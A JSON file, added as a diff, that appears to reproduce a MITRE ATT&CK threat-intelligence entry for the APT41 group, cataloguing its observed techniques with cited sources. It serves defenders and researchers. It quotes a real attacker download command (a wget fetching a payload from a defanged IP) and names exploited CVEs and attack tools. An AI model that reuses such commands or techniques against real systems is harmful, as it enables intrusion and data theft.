@@ -1,0 +1,4459 @@
+{
+  "attack_id": "G0096",
+  "notes": null,
+  "created": "23 September 2019",
+  "modified": "22 April 2025",
+  "name": "APT41",
+  "version": "4.1",
+  "contributors_list": [
+    "Kyaw Pyiyt Htet, @KyawPyiytHtet",
+    "Nikita Rostovcev, Group-IB"
+  ],
+  "descr": "[APT41](https://attack.mitre.org/groups/G0096) is a threat group that researchers have assessed as Chinese state-sponsored espionage group that also conducts financially-motivated operations. Active since at least 2012, [APT41](https://attack.mitre.org/groups/G0096) has been observed targeting various industries, including but not limited to healthcare, telecom, technology, finance, education, retail and video game industries in 14 countries.(Citation: apt41_mandiant) Notable behaviors include using a wide range of malware and tools to complete mission objectives. [APT41](https://attack.mitre.org/groups/G0096) overlaps at least partially with public reporting on groups including BARIUM and [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)\n",
+  "technique_table_data": [
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1134",
+      "name": "Access Token Manipulation",
+      "descr": "During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local `NT AUTHORITY\\SYSTEM` privilege escalation.(Citation: Mandiant APT41)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1087",
+      "name": "Account Discovery",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Local Account",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used built-in <code>net</code> commands to enumerate local administrator groups.(Citation: Rostovcev APT41 2021)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "Domain Account",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used built-in <code>net</code> commands to enumerate domain administrator users.(Citation: Rostovcev APT41 2021)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1098",
+      "name": "Account Manipulation",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "007",
+          "name": "Additional Local or Domain Groups",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) has added user accounts to the User and Admin groups.(Citation: FireEye APT41 Aug 2019) ",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1583",
+      "name": "Acquire Infrastructure",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "007",
+          "name": "Serverless",
+          "descr": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used infrastructure hosted behind Cloudflare or utilized Cloudflare Workers for command and control.(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1595",
+      "name": "Active Scanning",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "Vulnerability Scanning",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used the Acunetix SQL injection vulnerability scanner in target reconnaissance operations, as well as the JexBoss tool to identify vulnerabilities in Java applications.(Citation: Rostovcev APT41 2021)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "Wordlist Scanning",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) leverages various tools and frameworks to brute-force directories on web servers.(Citation: Rostovcev APT41 2021)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1071",
+      "name": "Application Layer Protocol",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Web Protocols",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits.(Citation: FireEye APT41 March 2020) \n[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used HTTPS for command and control.(Citation: Google Cloud APT41 2024)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) ran `wget http://103.224.80[.]44:8080/kernel` to download malicious payloads.(Citation: Mandiant APT41)\n",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "File Transfer Protocols",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used exploit payloads that initiate download via [ftp](https://attack.mitre.org/software/S0095).(Citation: FireEye APT41 March 2020)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "004",
+          "name": "DNS",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used DNS for C2 communications.(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021) ",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1560",
+      "name": "Archive Collected Data",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Archive via Utility",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) created a RAR archive of targeted files for exfiltration.(Citation: FireEye APT41 Aug 2019) Additionally, [APT41](https://attack.mitre.org/groups/G0096) used the makecab.exe utility to both download tools, such as NATBypass, to the victim network and to archive a file for exfiltration.(Citation: apt41_dcsocytec_dec2022)\n[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used `rar` to compress data downloaded from internal Oracle databases prior to exfiltration.(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "Archive via Custom Method",
+          "descr": "During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) hex-encoded PII data prior to exfiltration.(Citation: Mandiant APT41)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1119",
+      "name": "Automated Collection",
+      "descr": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used tools such as SQLULDR2 and PINEGROVE to gather local system and database information.(Citation: Google Cloud APT41 2024)",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1197",
+      "name": "BITS Jobs",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used [BITSAdmin](https://attack.mitre.org/software/S0190) to download and install payloads.(Citation: FireEye APT41 March 2020)(Citation: Crowdstrike GTR2020 Mar 2020)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1547",
+      "name": "Boot or Logon Autostart Execution",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Registry Run Keys / Startup Folder",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) created and modified startup files for persistence.(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021) [APT41](https://attack.mitre.org/groups/G0096) added a registry key in <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost</code> to establish persistence for [Cobalt Strike](https://attack.mitre.org/software/S0154).(Citation: FireEye APT41 March 2020)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1037",
+      "name": "Boot or Logon Initialization Scripts",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used a hidden shell script in `/etc/rc.d/init.d` to leverage the `ADORE.XSEC`backdoor and `Adore-NG` rootkit.(Citation: apt41_mandiant)",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1110",
+      "name": "Brute Force",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) performed password brute-force attacks on the local admin account.(Citation: FireEye APT41 Aug 2019)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1059",
+      "name": "Command and Scripting Interpreter",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "PowerShell",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) leveraged PowerShell to deploy malware families in victims’ environments.(Citation: FireEye APT41 Aug 2019)(Citation: FireEye APT41 March 2020)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "Windows Command Shell",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used <code>cmd.exe /c</code> to execute commands on remote machines.(Citation: FireEye APT41 Aug 2019)\n[APT41](https://attack.mitre.org/groups/G0096) used a batch file to install persistence for the [Cobalt Strike](https://attack.mitre.org/software/S0154) BEACON loader.(Citation: FireEye APT41 March 2020)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used `cmd.exe` to execute reconnaissance commands.(Citation: Mandiant APT41)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "004",
+          "name": "Unix Shell",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used Linux shell commands for system survey and information gathering prior to exploitation of vulnerabilities such as CVE-2019-19871.(Citation: FireEye APT41 March 2020)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "007",
+          "name": "JavaScript",
+          "descr": "During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) deployed JScript web shells on compromised systems.(Citation: Mandiant APT41)\n",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1586",
+      "name": "Compromise Accounts",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "Cloud Accounts",
+          "descr": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used compromised Google Workspace accounts for command and control.(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1136",
+      "name": "Create Account",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Local Account",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) has created user accounts.(Citation: FireEye APT41 Aug 2019) ",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1543",
+      "name": "Create or Modify System Process",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "Windows Service",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) modified legitimate Windows services to install malware backdoors.(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021) [APT41](https://attack.mitre.org/groups/G0096) created the StorSyncSvc service to provide persistence for [Cobalt Strike](https://attack.mitre.org/software/S0154).(Citation: FireEye APT41 March 2020)\n[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used Windows Services with names such as `Windows Defend` for persistence of [DUSTPAN](https://attack.mitre.org/software/S1158).(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1555",
+      "name": "Credentials from Password Stores",
+      "technique_used": true,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "Credentials from Web Browsers",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used BrowserGhost, a tool designed to obtain credentials from browsers, to retrieve information from password stores.(Citation: Rostovcev APT41 2021)",
+          "subtechniques": []
+        }
+      ],
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) has obtained information about accounts, lists of employees, and plaintext and hashed passwords from databases.(Citation: Rostovcev APT41 2021)"
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1486",
+      "name": "Data Encrypted for Impact",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user.(Citation: FireEye APT41 Aug 2019) [APT41](https://attack.mitre.org/groups/G0096) also used Microsoft Bitlocker to encrypt workstations and Jetico’s BestCrypt to encrypt servers.(Citation: apt41_dcsocytec_dec2022)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1213",
+      "name": "Data from Information Repositories",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "Code Repositories",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) cloned victim user Git repositories during intrusions.(Citation: Rostovcev APT41 2021)",
+          "subtechniques": []
+        }
+      ],
+      "descr": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) collected data from victim Oracle databases using SQLULDR2.(Citation: Google Cloud APT41 2024)"
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1005",
+      "name": "Data from Local System",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) has uploaded files and data from a compromised host.(Citation: Group IB APT 41 June 2021)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks.(Citation: Mandiant APT41) ",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1001",
+      "name": "Data Obfuscation",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "Protocol or Service Impersonation",
+          "descr": "During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server.(Citation: Mandiant APT41)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1074",
+      "name": "Data Staged",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Local Data Staging",
+          "descr": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) involved exporting data from Oracle databases to local CSV files prior to exfiltration.(Citation: Google Cloud APT41 2024)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) copied the local `SAM` and `SYSTEM` Registry hives to a staging directory.(Citation: Mandiant APT41)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1030",
+      "name": "Data Transfer Size Limits",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) transfers post-exploitation files dividing the payload into fixed-size chunks to evade detection.(Citation: Rostovcev APT41 2021)",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1140",
+      "name": "Deobfuscate/Decode Files or Information",
+      "descr": "During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used the DUSTPAN loader to decrypt embedded payloads.(Citation: Mandiant APT41)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1484",
+      "name": "Domain or Tenant Policy Modification",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Group Policy Modification",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used scheduled tasks created via Group Policy Objects (GPOs) to deploy ransomware.(Citation: apt41_mandiant)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1568",
+      "name": "Dynamic Resolution",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "Domain Generation Algorithms",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) has used DGAs to change their C2 servers monthly.(Citation: FireEye APT41 Aug 2019)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1573",
+      "name": "Encrypted Channel",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "Asymmetric Cryptography",
+          "descr": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) used HTTPS for command and control.(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1546",
+      "name": "Event Triggered Execution",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "008",
+          "name": "Accessibility Features",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) leveraged sticky keys to establish persistence.(Citation: FireEye APT41 Aug 2019) ",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1480",
+      "name": "Execution Guardrails",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Environmental Keying",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines. [APT41](https://attack.mitre.org/groups/G0096) has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number.(Citation: Twitter ItsReallyNick APT41 EK)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1048",
+      "name": "Exfiltration Over Alternative Protocol",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "Exfiltration Over Unencrypted Non-C2 Protocol",
+          "descr": "During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain.(Citation: Mandiant APT41)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1041",
+      "name": "Exfiltration Over C2 Channel",
+      "descr": "During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used its Cloudflare services C2 channels for data exfiltration.(Citation: Mandiant APT41)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1567",
+      "name": "Exfiltration Over Web Service",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "002",
+          "name": "Exfiltration to Cloud Storage",
+          "descr": "[APT41 DUST](https://attack.mitre.org/campaigns/C0040) exfiltrated collected information to OneDrive.(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        }
+      ],
+      "descr": "During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used Cloudflare services for data exfiltration.(Citation: Mandiant APT41)"
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1190",
+      "name": "Exploit Public-Facing Application",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.(Citation: FireEye APT41 March 2020) [APT41](https://attack.mitre.org/groups/G0096) leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access.(Citation: Rostovcev APT41 2021) [APT41](https://attack.mitre.org/groups/G0096) exploited CVE-2021-26855 against a vulnerable Microsoft Exchange Server to gain initial access to the victim network.(Citation: apt41_dcsocytec_dec2022)\n\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access.(Citation: Mandiant APT41)",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1203",
+      "name": "Exploitation for Client Execution",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.(Citation: FireEye APT41 Aug 2019) ",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1133",
+      "name": "External Remote Services",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service.(Citation: FireEye APT41 Aug 2019)\n",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1008",
+      "name": "Fallback Channels",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used the Steam community page as a fallback mechanism for C2.(Citation: FireEye APT41 Aug 2019) ",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) has executed <code>file /bin/pwd</code> on exploited victims, perhaps to return architecture related information.(Citation: FireEye APT41 March 2020)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1574",
+      "name": "Hijack Execution Flow",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "DLL",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) has used search order hijacking to execute malicious payloads, such as [Winnti for Windows](https://attack.mitre.org/software/S0141).(Citation: Crowdstrike GTR2020 Mar 2020) [APT41](https://attack.mitre.org/groups/G0096) has also used legitimate executables to perform DLL side-loading of their malware.(Citation: FireEye APT41 Aug 2019) \n[APT41 DUST](https://attack.mitre.org/campaigns/C0040) involved the use of DLL search order hijacking to execute [DUSTTRAP](https://attack.mitre.org/software/S1159).(Citation: Google Cloud APT41 2024) [APT41 DUST](https://attack.mitre.org/campaigns/C0040) used also DLL side-loading to execute [DUSTTRAP](https://attack.mitre.org/software/S1159) via an AhnLab uninstaller.(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "006",
+          "name": "Dynamic Linker Hijacking",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) has configured payloads to load via LD_PRELOAD.(Citation: Crowdstrike GTR2020 Mar 2020)\t",
+          "subtechniques": []
+        }
+      ],
+      "descr": "During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries.(Citation: Mandiant APT41) "
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1562",
+      "name": "Impair Defenses",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "006",
+          "name": "Indicator Blocking",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) developed a custom injector that enables an Event Tracing for Windows (ETW) bypass, making malicious processes invisible to Windows logging.(Citation: Rostovcev APT41 2021)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1656",
+      "name": "Impersonation",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) impersonated an employee at a video game developer company to send phishing emails.(Citation: apt41_mandiant)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1070",
+      "name": "Indicator Removal",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Clear Windows Event Logs",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) attempted to remove evidence of some of its activity by clearing Windows security and system events.(Citation: FireEye APT41 Aug 2019)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "003",
+          "name": "Clear Command History",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) attempted to remove evidence of some of its activity by deleting Bash histories.(Citation: FireEye APT41 Aug 2019)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "004",
+          "name": "File Deletion",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) deleted files from the system.(Citation: FireEye APT41 Aug 2019)(Citation: Rostovcev APT41 2021)\n[APT41 DUST](https://attack.mitre.org/campaigns/C0040) deleted various artifacts from victim systems following use.(Citation: Google Cloud APT41 2024)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used [certutil](https://attack.mitre.org/software/S0160) to download additional files.(Citation: FireEye APT41 March 2020)(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: Group IB APT 41 June 2021) [APT41](https://attack.mitre.org/groups/G0096) downloaded post-exploitation tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154) via command shell following initial access.(Citation: Rostovcev APT41 2021) [APT41](https://attack.mitre.org/groups/G0096) has uploaded Procdump   and NATBypass to a staging directory and has used these tools in follow-on activities.(Citation: apt41_dcsocytec_dec2022)\n[APT41 DUST](https://attack.mitre.org/campaigns/C0040) involved execution of `certutil.exe` via web shell to download the [DUSTPAN](https://attack.mitre.org/software/S1158) dropper.(Citation: Google Cloud APT41 2024)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) downloaded malicious payloads onto compromised systems.(Citation: Mandiant APT41)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1056",
+      "name": "Input Capture",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "001",
+          "name": "Keylogging",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) used a keylogger called GEARSHIFT on a target system.(Citation: FireEye APT41 Aug 2019)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1570",
+      "name": "Lateral Tool Transfer",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) uses remote shares to move and remotely execute payloads during lateral movemement.(Citation: Rostovcev APT41 2021)",
+      "subtechniques": []
+    },
+    {
+      "domain": "enterprise",
+      "id": "T1036",
+      "name": "Masquerading",
+      "technique_used": false,
+      "subtechniques": [
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "004",
+          "name": "Masquerade Task or Service",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) has created services to appear as benign system tools.(Citation: Group IB APT 41 June 2021)\n[APT41 DUST](https://attack.mitre.org/campaigns/C0040) disguised [DUSTPAN](https://attack.mitre.org/software/S1158) as a legitimate Windows binary such as `w3wp.exe` or `conn.exe`.(Citation: Google Cloud APT41 2024)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used `SCHTASKS  /Change` to modify legitimate scheduled tasks to run malicious code.(Citation: Mandiant APT41)",
+          "subtechniques": []
+        },
+        {
+          "technique_used": true,
+          "domain": "enterprise",
+          "id": "005",
+          "name": "Match Legitimate Resource Name or Location",
+          "descr": "[APT41](https://attack.mitre.org/groups/G0096) attempted to masquerade their files as popular anti-virus software.(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)\nDuring [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used file names beginning with USERS, SYSUSER, and SYSLOG for [DEADEYE](https://attack.mitre.org/software/S1052), and changed [KEYPLUG](https://attack.mitre.org/software/S1051) file extensions from .vmp  to .upx likely to avoid hunting detections.(Citation: Mandiant APT41)",
+          "subtechniques": []
+        }
+      ]
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1112",
+      "name": "Modify Registry",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used a malware variant called GOODLUCK to modify the registry in order to steal credentials.(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1104",
+      "name": "Multi-Stage Channels",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.(Citation: FireEye APT41 March 2020)",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1599",
+      "name": "Network Boundary Bridging",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used `NATBypass` to bypass firewall restrictions and to access compromised systems via RDP.(Citation: apt41_dcsocytec_dec2022)",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1046",
+      "name": "Network Service Discovery",
+      "descr": "[APT41](https://attack.mitre.org/groups/G0096) used a malware variant called WIDETONE to conduct port scans on specified subnets.(Citation: FireEye APT41 Aug 2019)",
+      "subtechniques": []
+    },
+    {
+      "technique_used": true,
+      "domain": "enterprise",
+      "id": "T1135",
